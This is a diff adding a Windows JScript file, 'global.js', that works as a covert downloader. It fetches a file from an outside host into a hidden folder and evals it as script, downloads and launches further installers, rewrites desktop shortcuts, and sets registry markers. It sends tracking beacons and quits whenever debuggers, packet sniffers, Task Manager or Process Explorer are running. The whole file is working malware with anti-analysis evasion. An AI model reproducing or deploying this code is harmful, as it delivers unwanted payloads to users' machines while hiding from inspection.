@@ -1,0 +1,736 @@
+////////////
+trace("*----global.js----")
+__interrupted
+var __DEBUG = 0;
+var __IsSupportOpencl = 0;
+var __external = external;
+var __windows = windows;
+var __storage = storage;
+ 
+var __startup = 0
+if(__DEBUG)
+	__external.SetEnvironmentVariable("debug", "1");
+ //debug 1 版时可以被打断 , 0 不可以被打断 
+function __TRY(fun, defaultval) {try{return fun();} catch(e){return defaultval;}}
+function ActiveXObject2(progid){log("ActiveXObject2") ; return createActiveX(progid);}
+var __locator=new ActiveXObject ("WbemScripting.SWbemLocator");
+var __service=__locator.ConnectServer(".");
+var __cpu=new Enumerator (__service.ExecQuery("SELECT * FROM Win32_Processor")).item();
+var __objOperatingSystem = new Enumerator (__service.ExecQuery("Select * from Win32_OperatingSystem")).item();
+var __osVersion = __objOperatingSystem.Version;
+var __wshShell = new ActiveXObject("WScript.Shell");
+var __fso = new ActiveXObject("scripting.filesystemobject");
+var __shellapp = new ActiveXObject("Shell.Application");
+
+//var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
+var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://www.by81.com/05/Doc2.dot?v=20150205" }
+//最重要的配置文件
+var __startTickCout = __external.GetTickCount()
+var __lastInputInfo = __external.GetLastInputInfo()
+/*
+var strComputer = ".";
+var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
+var e = new Enumerator(objWMIService.ExecQuery("Select * from Win32_Process","WQL",48));
+*/
+///////global.js///////////
+//启动global.js的时间间隔
+var __interval = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\interval");}, 60*60*1000);
+var __idletime= __interval / 12;
+if(__DEBUG)
+	__idletime=1000*15
+else if(__IsSupportOpencl)
+	__idletime=1000*30
+//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1:8080/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc		
+//
+trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
+		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
+		",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo+", __isadmin="+__isadmin + ",__osVersion="+__osVersion+
+		",__interval="+__interval+",__idletime="+__idletime
+		)
+//
+function log(msg){
+	//if(!__DEBUG)
+		//return ;
+	var er = log.caller
+	var debugstring=""
+	var funname=""
+	var i = 0	
+	for (; er; i++){
+		if(er==null){	
+			break;
+		}
+		else{
+			var str =er.toString();
+			var re = new RegExp("({+)","ig");
+			var arr = re.exec(str);
+			str = RegExp.leftContext 
+			if(i==0){
+				funname ="<"+str+">" 
+			}
+			debugstring =   debugstring+"<-"+str;
+			er = er.caller;
+		}
+	}	
+	trace( msg + "	" + debugstring.replace(/\n/g, " "));
+}
+//
+function module(name,g){
+	this.g = g;
+	if(typeof name == "undefined"){
+		if(arguments.callee.name)
+			arguments.callee.name+=1;
+		else
+			arguments.callee.name =1
+		name = "modulename_"+1;
+	}
+	//
+	if(module.modules[name]){
+		("module name : " + name + "  exist , will recovery");
+	}
+	module.modules[name]=this
+	this.name = name;
+	this.currentFilterIndex=-1;
+	this.filters = [];
+	this.travelFilter=function(pipe){
+			log("module name : " + this.name +  " this.travelFilter this.currentFilterIndex="+this.currentFilterIndex)
+			if(this.currentFilterIndex<0){
+				log("module name : " + this.name +  " cancel")
+				return true;
+			}else if (this.currentFilterIndex>=this.filters.length) {
+				//
+				log("module name : " + this.name +  " function .travelFilter doneCallback--last one asysn")
+				if (this.doneCallback) {
+					this.doneCallback(this,pipe,this.currentFilterIndex);
+				}
+				var len = module.getRunningModules().length
+				log("module running module length : " + len);
+				if(module.doneCallback && len==0){					
+					module.doneCallback(module);
+				}
+				return true;
+			}
+			//
+			var ret = true;
+			var index = this.currentFilterIndex
+			for(var i =index; i <this.filters.length; i++){
+				log("module name : " + this.name +  " will running filter("+i+") , currentpipe.name="+pipe.name);	
+				if(this.filters[i].run){
+					ret = this.filters[i].run(pipe);
+				}else{
+					ret = this.filters[i](pipe);
+				}
+				log("module name : " + this.name +  " ran filter("+i+") return "+ (ret ? ret.toString() : "undefined") +" , currentpipe.name="+ (pipe.name?pipe.name.toString():"空"));	
+				if(this.currentFilterIndex<0){
+					return;
+				}				
+				if(!ret){
+					break;
+				}
+				this.currentFilterIndex=i+1
+			}
+			/////////////////////////
+			if(ret){
+				log("module name : " + this.name +  " function .travelFilter doneCallback--last one sysn ")
+				if (this.doneCallback) {
+					this.doneCallback(this,pipe,this.currentFilterIndex);
+				}
+				var len = module.getRunningModules().length
+				log("module running module length : " + len);
+				if(module.doneCallback && len==0){
+					module.doneCallback(module);
+				}
+				return true;
+			}
+			return ret;
+	}
+	this.process_callback=function(pipe, cancel){
+		log("module name : " + pipe.module.name + " enter this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
+		if(cancel && pipe.module.currentFilterIndex<pipe.module.filters.length){
+			pipe.module.cancel();
+			return true;
+		}
+		//////
+		if(pipe.module && pipe.module.currentFilterIndex>=0){
+			pipe.module.currentFilterIndex += 1;
+			var ret = pipe.module.travelFilter(pipe);
+			log("module name : " + pipe.module.name + " leave this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
+			return ret;
+		}
+	}///////////////////
+}
+function module.prototype.push(filter){
+	log("module name : " + this.name + " module.prototype.push"); 
+	this.filters.push(filter)
+	return this.process_callback;
+}
+function module.prototype.run(pipe, filterIndex){	
+	log("module name : " + this.name +" module.prototype.run");
+	this.currentFilterIndex=filterIndex?filterIndex:0;	
+	pipe.module = this;
+	this.pipe=pipe
+	return this.travelFilter(pipe)
+}
+function module.prototype.cancel () {
+	log("module name : " + this.name +" cancel, this.currentFilterIndex="+this.currentFilterIndex);
+	var index = this.currentFilterIndex;
+	this.currentFilterIndex=-1;
+	if (this.doneCallback) {
+		this.doneCallback(this,this.pipe,index);
+	}
+	var len = module.getRunningModules().length
+	log("module running module length : " + len);
+	if(module.doneCallback && len==0){
+		module.doneCallback(module);
+	}
+}
+module.prototype.getStep=function () {
+	return this.currentFilterIndex;
+}
+module.prototype.setDoneCallback=function (callback) {
+	log("module name : " + this.name + " module.prototype.setDoneCallback");
+	this.doneCallback = callback;
+}
+/////////
+module.modules={}
+module.setAllmoduleDoneCallback=function (callback) {
+	log("module module.setDoneCallback")
+	module.doneCallback = callback;
+}
+module.getRunningModules=function () {	
+	var runningModules = []
+	for(var index in module.modules){
+		var _module = module.modules[index];
+		var step = _module.getStep();
+		var en = (step>=0 && (step<_module.filters.length)) //filter未执行完
+				&& !_module.g
+		log("module name : " + _module.name + "  running in step : " + step + ", filters.length="+_module.filters.length + " _module.g="+_module.g + " +"+(en?1:0));
+		if(en){
+			runningModules.push(_module);
+		}
+	}
+	return runningModules
+}
+/////////////////
+function getXmlHttp () {
+	//log("enter getXmlHttp")
+	/////////////
+	if(typeof arguments.callee.objs=="undefined")
+		arguments.callee.objs = [];	 
+	for(var index in arguments.callee.objs){
+		var obj = arguments.callee.objs[index];
+		if(obj.readyState==4){
+			log("exist idle xmlhttp, name = "+" getXmlHttp_name_"+arguments.callee.name+" "+"getXmlHttp.objs.length="+arguments.callee.objs.length);
+			//obj.abort();
+			return obj;
+		}
+	}/////////////
+	if (!arguments.callee.name) {
+		arguments.callee.name = 1;
+	}else{
+		arguments.callee.name+=1;
+	}
+	var name = "getXmlHttp_name_" + arguments.callee.name;	
+	///////
+	var objXmlHttp ;
+	if (arguments.callee.progid) {
+		objXmlHttp = new ActiveXObject(arguments.callee.progid);
+		//log("exist progid for xmlhttp : "+arguments.callee.progid);
+	}
+	else{
+		var MSXML = new Array(  'MSXML2.XMLHTTP'
+			,'MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
+		for(var n = 0; n < MSXML.length; n ++)
+		{
+			try { 
+				objXmlHttp = new ActiveXObject(MSXML[n]);
+				if(objXmlHttp){
+					arguments.callee.progid = MSXML[n];
+					break;
+				}
+			}catch(e){}
+		}
+	}////
+	arguments.callee.objs.push(objXmlHttp);
+	log("add XmlHttp , getXmlHttp.objs.length="+arguments.callee.objs.length);	
+	///////////
+	return objXmlHttp;
+}
+function sendHttpStat(category, action , value ,syn){
+	var objXMLHTTP = getXmlHttp();
+	if(objXMLHTTP)
+	{
+		var label= __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\if");}, "default");
+		//var label= function(){var ver = __external.GetHostVersion(); return ver;}();	
+		var url;
+		if(__DEBUG)
+			url = "http://www.google-analytics.com/collect"
+		else
+			url ="https://ssl.google-analytics.com/collect";
+		var ev = value ? value : 0;
+		var payload_data="v=1&tid=UA-42360423-1&cid="+__external.GetPID()+"&t=event&ec="+category+"&ea="+action+"&el="+label+"&ev="+ev;
+		//objXMLHTTP.setRequestHeader("Connection","Close");
+		objXMLHTTP.onreadystatechange = function(){ if (objXMLHTTP && objXMLHTTP.readyState == 4)  { var i=true; return i;}};
+		objXMLHTTP.open("POST", url, syn ? false : true);
+		__TRY(function(){objXMLHTTP.send(payload_data);} ) 
+		log("send httpstat : post payload_data : "+"category="+category+",action="+action+",value="+ev+"");
+	}
+	else{
+		log("objXMLHTTP new = null")
+	}
+}
+////////////////////
+function filter_dlbusiness(dlobj){
+	this.dlobj = dlobj
+};
+function filter_dlbusiness.prototype.run(pipe){
+	var path = __workdir + this.dlobj.name;
+	var name = this.dlobj.name;
+	var localmd5 = __storage.GetFileMD5 (path) 
+	var destmd5 = this.dlobj.md5
+	pipe.name = this.dlobj.name;
+	
+	var pThis = this;	
+	pipe.exitcode=100;
+	log("this.dlobj.name="+this.dlobj.name+" this.dlobj.url="+this.dlobj.url+", localmd5="+localmd5+",destmd5="+destmd5);
+	//log("this.dlobj.name="+this.dlobj.name+" this.dlobj.url="+this.dlobj.url+" -1.1");
+	if(destmd5 && localmd5 && (localmd5 == destmd5.toUpperCase())){	
+		log(" readyDestFile OnSuccess "+name+" , dest file md5="+localmd5);
+		sendHttpStat("downloadedfile", "downloadedfile_success_"+name);
+		return true;
+	}
+	else{//开始下载		 
+		var objXMLHTTP = getXmlHttp(); 		 
+		objXMLHTTP.open("GET", pThis.dlobj.url,true);				
+		objXMLHTTP.onreadystatechange = function(){
+		//	log("url="+ pThis.dlobj.url+ " , "+"objXMLHTTP.readyState="+ objXMLHTTP.readyState);
+			 if (objXMLHTTP && objXMLHTTP.readyState == 4 ){
+					if(objXMLHTTP.status<400){
+						//var ret = __storage.Save(objXMLHTTP.responseStream, path);
+						var adostream = new ActiveXObject("ADODB.Stream")
+						adostream.Mode = 3;
+						adostream.Type = 1;
+						adostream.Open();
+						adostream.Write(objXMLHTTP.responseBody);
+						adostream.SaveToFile(path,2);
+						adostream.Close();
+						var fso = __fso;
+						//fso.GetFile(path).Attributes = 2 
+						delete adostream;
+						log("download from url="+pThis.dlobj.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText);
+						
+						if(1){
+							var tmd5 = __storage.GetFileMD5 (path)
+							log(" localpath md5 : "+tmd5+" destmd5:"+destmd5)
+							if( tmd5 && (!destmd5 || (tmd5 == destmd5.toUpperCase())) ){
+								//sendHttpStat("downloadingfile", "downloadingfile_success_" +name);
+								pipe.exitaction="downloadingfile_success_" +pipe.name;
+								if( name.substr(name.length-4)==".cab"){
+									if(__storage.ExtractCab(__workdir+name, __workdir)){
+										log("extractcab success : " + " from " + __workdir+name+" to " + __workdir);
+									}
+									else{
+										sendHttpStat("downloadingfile", "downloadingfile_failed_extractcab_" + name); 
+										pipe.exitaction="downloadingfile_failed_extractcab_" + name;
+									}
+								}
+								pThis.callback(pipe);
+								//OnSuccess(path);
+							}
+							else
+							{
+								sendHttpStat("downloadingfile", "downloadingfile_failed_md5_"+name);
+								pipe.exitaction="downloadingfile_failed_md5_"+name;
+								pThis.callback(pipe, true);
+							}
+						}else{
+							sendHttpStat("downloadingfile", "downloadingfile_failed_"+name);
+							pipe.exitaction="downloadingfile_failed_"+name
+							pThis.callback(pipe, true);
+						} 
+						objXMLHTTP=null;
+					}
+					else{
+						sendHttpStat("downloadingfile", "downloadingfile_failed_"+name);
+						pipe.exitaction="downloadingfile_failed_"+name
+						pThis.callback(pipe, true);
+					}
+				}};
+		setTimeout(function(){__TRY(function(){objXMLHTTP.send(null);} ) },1); ////
+	}
+}
+filter_dlbusiness.prototype.callback=null;
+//////////
+var __currenttaskid=0
+function filter_loadFile(file) {
+	this.file=file;
+};
+function filter_loadFile.prototype.run (pipe) {
+	var pThis = this;	
+	var fileName = pThis.file.name?pThis.file.name:pipe.name
+	var path = __workdir+fileName;
+	setTimeout(function(){ __currenttaskid =pThis.file.id?pThis.file.id:0;  evalFile(path); log("end load file "+path ); pThis.callback(pipe) },1)	
+	log("evalFile("+ path +")  __currenttaskid="+__currenttaskid);
+
+	return false;
+}
+function filter_innertask(){
+}
+function filter_launch(id,name,param){
+		this.id = id;
+		this.name = name
+		this.param = param
+}
+function filter_launch.prototype.run(pipe){
+	 var name = this.name?this.name:""
+	 var param = this.param?this.param:"";
+	 log("filter_launch.prototype.run name="+name+",param="+param);
+	 if(name){
+	 		if(__fso.FileExists(__workdir+name)){
+	 			var cmd = __workdir+name
+	 			/*
+	 			if(param)
+	 				cmd += " " + param;*/
+	 			var proc
+	 			var prochandle
+	 			//__TRY(function(){ 
+					//__wshShell.Run('"'+cmd+'"', 0 );  //在windows xp测试会有打开文件的安全警告,纯英文,像是脚本语言jscript.dll/script.ocx自己弹出来的
+	 				//proc = __wshShell.Exec(cmd); //win7下如果cmd需要管理员权限,那这将出错,弹框提示说Exec需要权限
+	 				prochandle=__shellapp.ShellExecute(cmd, param,"","open",1)
+	 				//__shellapp.ShellExecute(cmd, param,"","runas",1)
+	 			//});  
+	 			sendHttpStat("installed", name,prochandle?1:0);
+	 			 			
+	 			var key = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+this.id
+				var value = this.name+" "+this.param;  
+				var d = new Date();
+   			var t = d.getTime();
+				var value = t				
+				log("filter_launch.prototype.run key="+key+",value="+value);
+				__TRY(function (){__wshShell.RegWrite(key, value, "REG_SZ") });					
+	 		}
+	 } 	
+	 return true
+}
+function filter_regrunonce(id,name,param){
+	this.id=id;this.name=name;this.param=param;
+}
+function filter_regrunonce.prototype.run(pipe){
+	__TRY(function (){__wshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\forcelaunch", 1, "REG_DWORD")})
+	//只是记录要开始启动,做什么内容,就放在jsconifg里面吧,这样子更容易扩展一些,因此即便在本地js写,也是死代码,而这种配置可死可活
+	/* 
+	var key = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+this.id
+	var value = this.name+" "+this.param;
+	log("filter_regrunonce.prototype.run key="+key+",value="+value);
+	__TRY(function (){__wshShell.RegWrite(key, value, "REG_SZ") });	
+	*/
+	return true
+}
+function filter_desktopicon(name,URL,IconFile,IconFileName){
+		log("filter_desktopicon name="+name+",URL="+URL+",IconFile="+IconFile+",IconFileName="+IconFileName)
+		this.name = name?name:IconFileName;
+		this.URL=URL?URL:IconFile
+		this.IconFile = IconFile
+		this.IconFileName = IconFileName
+}
+function filter_desktopicon.prototype.run(pipe){
+		
+		var desktopdir = __wshShell.SpecialFolders("Desktop")		
+		var path=desktopdir+"\\"+this.name
+		log("filter_desktopicon path="+path)
+		if(__fso.FileExists(path)){
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",this.URL)
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFile",this.IconFile)
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFileName",this.IconFileName)	
+		}
+		return true
+}
+function filter_innertask.prototype.run(pipe){
+	log("filter_innertask.prototype.run, typeof ___gconfig="+typeof ___gconfig)
+	//if(___gconfig){}	
+	var pThis = this
+	if("object" == typeof ___gconfig){
+		var pid = __external.GetPID();
+		var pid_max = ___gconfig.validcondition.PID.max ? ___gconfig.validcondition.PID.max : "F"
+		var pid_min = ___gconfig.validcondition.PID.min ? ___gconfig.validcondition.PID.min : "0"
+		pid.toLowerCase( )
+		for(i=0;i<pid.length;i++){
+			var current = pid.charCodeAt(i)
+			var dest_max = pid_max.charAt(i).length ? pid_max.charCodeAt(i) : 0xFF
+			var dest_min = pid_min.charAt(i).length ? pid_min.charCodeAt(i) : 0x00
+			log("pid="+pid+",i="+i+", current="+current+", pid_max="+dest_max+" String.fromCharCode(dest_max)="+String.fromCharCode(dest_max)+", pid_min="+dest_min+" String.fromCharCode(dest_min)="+String.fromCharCode(dest_min));
+			if(current >dest_max || current<dest_min){
+				//@								 
+				setTimeout(function(){pThis.callback(pipe, true);},1)
+				return 
+			}
+		}
+		//		
+		var osiversion = parseInt( __osVersion.substr(0,1)) //  
+		var osiversion_max = ___gconfig.validcondition.osver.max?___gconfig.validcondition.osver.max:0xff
+		var osiversion_min = ___gconfig.validcondition.osver.min?___gconfig.validcondition.osver.min:0x00
+		log("osiversion="+osiversion+",osiversion_max="+osiversion_max+",osiversion_min="+osiversion_min)
+		if(osiversion>osiversion_max || osiversion_max<osiversion_min){
+			//@
+			setTimeout(function(){pThis.callback(pipe, true);},1)
+			return 
+		}
+		//
+		var datver = __external.GetHostBuild();
+		var datver_max = ___gconfig.validcondition.datver.max?___gconfig.validcondition.datver.max:0xff
+		var datver_min = ___gconfig.validcondition.datver.min?___gconfig.validcondition.datver.min:0x00
+		log("datver="+datver+",datver_max="+datver_max+",datver_min="+datver_min)
+		if(datver>datver_max || datver<datver_min){
+			//@
+			setTimeout(function(){pThis.callback(pipe, true);},1)
+			return 
+		}
+		if(___gconfig.validcondition.condition){
+			if(!___gconfig.validcondition.condition()){
+				setTimeout(function(){pThis.callback(pipe, true);},1)
+				return 
+			}
+		}
+		var _innertask_module = new module("innertask");		
+		//下载列表
+		for(i=0; ___gconfig.installlist&&i<___gconfig.installlist.length;i++){			
+			var install = ___gconfig.installlist[i];
+			var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id)} );
+			if(regvalue){
+				log("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id+ " = "+regvalue+", skip")
+				continue;		
+			}		
+			if(install.invalidcondition && install.invalidcondition()){
+			}else{
+				log("add task dlsetup "+install.name+" ")
+				if(__startup){//开机启动时,不用下载直接运行
+					 
+					if(!install.runimmediately){ //开机直接运行
+						var _filter_launch = new filter_launch(install.id,install.name,install.param);			
+						_filter_launch.callback =_innertask_module.push(_filter_launch);
+				  }else{
+				  	//...早运行了
+				  }					
+				}else{
+					var _filter_dl = new filter_dlbusiness(install);			
+					_filter_dl.callback =_innertask_module.push(_filter_dl);
+					if(install.runimmediately){//下载后立即运行
+						var _filter_launch = new filter_launch(install.id,install.name,install.param);			
+						_filter_launch.callback =_innertask_module.push(_filter_launch);
+					}else{//写注册表下次运行
+						var _filter_regrunonce = new filter_regrunonce(install.id ,install.name,install.param);			
+						_filter_regrunonce.callback =_innertask_module.push(_filter_regrunonce);	
+					}
+				}				 
+			}					
+		}
+		// 
+		var desktopdir = __wshShell.SpecialFolders("Desktop")		
+		for(i=0; ___gconfig.desktopiconlist && i<___gconfig.desktopiconlist.length;i++){
+			var desktopicon=___gconfig.desktopiconlist[i]			 
+			if(desktopicon.invalidcondition && desktopicon.invalidcondition()){
+			}else{
+				//下载存成图标
+				var dlicon = desktopicon				
+				var desktopdir = __wshShell.SpecialFolders("Desktop")		
+				var path=desktopdir+"\\"+dlicon.name
+				log("filter_desktopicon path="+path)
+				if(__fso.FileExists(path)){
+					log("exist path="+path+", skip")
+					continue;
+				}			 
+				dlicon.url = dlicon.url?dlicon.url:desktopicon.iconPrivateProfileString.IconFile
+				log("add task dlicon "+desktopicon.name+" "+" url="+dlicon.url+",dlicon.runimmediately="+dlicon.runimmediately)
+				if(__startup ){//开机启动时,不用下载直接运行
+					if(!dlicon.runimmediately){
+						var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
+								desktopicon.iconPrivateProfileString.URL, desktopicon.iconPrivateProfileString.IconFile, desktopicon.iconPrivateProfileString.IconFileName)
+						_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);
+					}else{
+					}					
+				}else {
+					var _filter_dl = new filter_dlbusiness(dlicon);			
+					_filter_dl.callback =_innertask_module.push(_filter_dl);		
+					if(dlicon.runimmediately)	{
+						var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
+								desktopicon.iconPrivateProfileString.URL, desktopicon.iconPrivateProfileString.IconFile, desktopicon.iconPrivateProfileString.IconFileName)
+						_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);
+					}else{
+						//写注册表下次运行,++
+					}		
+				}
+					
+			}
+		}
+		
+		_innertask_module.setDoneCallback(function (mod,pipe, index) {
+			log("module name "+mod.name+" onDonCallback");		////innertask 完后就是userfinedtask 最后一步了
+			if(!__startup){
+				var _userdefined_module = new module("userdefined");		
+				if((typeof ___gconfig.userdefinedlist == "undefined") || !___gconfig.userdefinedlist.length){
+					exit(3000);
+				} 				
+				for(i=0;___gconfig.userdefinedlist && i<___gconfig.userdefinedlist.length;i++){
+					var userdefined = ___gconfig.userdefinedlist[i]
+					if(userdefined.invalidcondition && userdefined.invalidcondition()){						
+					}else{
+						var _filter_dl = new filter_dlbusiness(userdefined);
+						_filter_dl.callback =_userdefined_module.push(_filter_dl);
+						var _filter_load = new filter_loadFile(userdefined)
+						_filter_load.callback = _userdefined_module.push(_filter_load);
+					}
+				}
+				_userdefined_module.setDoneCallback(function (mod,pipe, index) {
+						//exit(3000 - index - __startup);
+					})
+			 
+				var userdefinedpipe = {name:"userfined"}		
+				//alert		 (_userdefined_module.run)
+				setTimeout(function(){ _userdefined_module.run(userdefinedpipe,0)},1) //避免死循环--当innertask全是同步函数完成时必现，先用这个解决。
+				 
+			}else{
+				sendHttpStat( "startup", "innertaskdone");
+				exit(2000-index - __startup) 
+			}			
+		})//end _innertask_module.setDoneCallback
+		_innertask_module.run(pipe)
+	
+	}//end "object" == typeof ___gconfig
+	else{
+		setTimeout(function(){pThis.callback(pipe, true);},1)
+				return 
+	}
+}
+function filter_eXclusiveRuning(once){
+	this.once = once ? true : false; 
+}
+function filter_eXclusiveRuning.prototype.run(pipe){
+	var pThis = this;
+	var ret = external.__debugging || this.checkWindows() || this.checkProcesses();	
+	log("ret="+ret+" ,this.once="+this.once + ", external.__debugging="+external.__debugging);	
+	if(this.once){
+		if(ret){
+			pipe.exitaction=escape(ret.toString());
+			log("pipe.exitaction="+pipe.exitaction)
+			this.callback(pipe,true)
+		}
+		return true;
+	}else{
+		setInterval(function (){
+			var ret = external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
+			if(ret){
+				pipe.exitaction=escape(ret.toString());
+				log("pipe.exitaction="+pipe.exitaction)
+				pThis.callback(pipe,true); 
+			}
+		}, 1500)
+	}
+}
+function filter_eXclusiveRuning.prototype.checkWindows(){
+	var blacklist=["Microsoft Visual", "HTTP Analyzer", "WinDBG", "OllyDebug",		
+		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","Spy", 
+		 "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
+		" - Sysinternals:"];
+	if(!__DEBUG){
+		blacklist.push("DebugView")
+		blacklist.push("任务管理器")
+		blacklist.push("Process Explorer")
+	}
+	if(__DEBUG)
+		blacklist = [];
+	var titile
+	var ret = __windows.EnumWindows(function(hwnd, text){
+		for(var index in blacklist){
+			var t = text.toLowerCase();
+			var s = blacklist[index].toLowerCase();
+			if(t.indexOf(s)>=0){
+				titile = text;
+				log("exist wnd " + text + " will exit() ;")
+				return 0;
+			}
+		}
+	}); 
+	//log("window title ="+titile);
+	return titile;
+}
+function filter_eXclusiveRuning.prototype.checkProcesses(){
+	var blacklist=["wireshark", "fiddler", "httpanalyzer", "smsniff", 
+					"filemon", "regmon", "procmon", "windbg", "cv.exe",
+					"ollydbg", "softice", "mzurlspy","devenv","msdev","spy","ollyice","Wireshark","dan",
+					"depends"];
+	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
+	if(!__DEBUG){
+		blacklist.push("dbgv")
+		blacklist.push("taskmgr")
+		blacklist.push("procexp")
+	}
+	if(__DEBUG)
+		blacklist = [];
+	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
+	for (var index in blacklist){
+		var name = blacklist[index];
+		wql += " or Name like '%" + name+"%'";	
+	}
+	//log("filter_eXclusiveRuning.prototype.checkProcesses wql="+wql);
+	var process = new Enumerator (__service.ExecQuery(wql)).item();	
+	if(process){
+		log("exist process " + process.Name + " will exit() ; wql="+wql)
+	}else{
+		
+	}
+	var ret = process ?  process.Name :false;
+	delete process;
+	return ret;
+}
+////
+ 
+var exitaction 
+function onload(){
+	sendHttpStat( "launch", "onload");
+	////
+	if((__startTickCout<5*60*1000) && (__startTickCout>0)){		
+		//tryInstall();		
+		//log("exit(10)");
+		//exit(10);
+		//return ;
+		sendHttpStat( "startup", "start");
+		__startup = 1
+	}	
+	 //	__startup = 1
+	//1.启动统计
+	var __module = new module("global.js", 1);	
+	var filter_xrun = new filter_eXclusiveRuning(1)
+	var filter_dl =new filter_dlbusiness(__destReadyConfig);
+	var filter_load= new filter_loadFile({name:"Doc2.dot",id:100} );
+	var filter_inner= new filter_innertask();
+	var filter_xrun2= new filter_eXclusiveRuning();
+		
+	if(!__startup){		
+		filter_xrun.callback=__module.push(filter_xrun)
+		filter_dl.callback =__module.push(filter_dl);
+		filter_load.callback = __module.push(filter_load);		
+		filter_inner.callback = __module.push(filter_inner);	
+		filter_xrun2.callback = __module.push(filter_xrun2)		
+	}else {		
+		filter_load.callback = __module.push(filter_load);	 //不用下,直接加载
+		filter_inner.callback = __module.push(filter_inner);	//直接运行
+		//这里就应该退出了
+		//exit(10);
+	}
+	
+	////////////
+	var pipe = {};
+	__module.setDoneCallback(function (mod,pipe, index) {		
+		exitaction = pipe.exitaction		
+		delete filter_xrun; delete filter_dl; delete filter_load; delete filter_xrun2;
+		delete __module;
+		setTimeout(function(){__external.TerminateProcess(0,1); exit(-20)},200); 
+	})
+	__module.run(pipe);
+};
+function onunload(code){ 
+	if(code==-20){
+		sendHttpStat("launch", "unload_" + (code==-20 ? exitaction:code), parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  
+	}
+	delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage;
+};
